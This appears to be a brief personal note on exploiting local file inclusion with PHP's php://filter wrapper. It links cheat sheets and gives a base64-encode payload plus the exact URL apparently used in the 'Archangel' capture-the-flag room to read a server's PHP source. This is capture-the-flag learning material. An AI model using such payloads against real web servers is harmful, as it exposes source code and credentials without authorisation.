
https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225

This one is for member only

Shifted to this

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter


`_page=php://filter/convert.base64-encode/resource=index_
`
This payload forces PHP to base64 encode the file before it is used or rendered in the response. Now we replace page parameter value with above-mentioned payload and check output.


For [[Archangel]] below command was used

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```


another usefull resource is 

https://highon.coffee/blog/lfi-cheat-sheet/

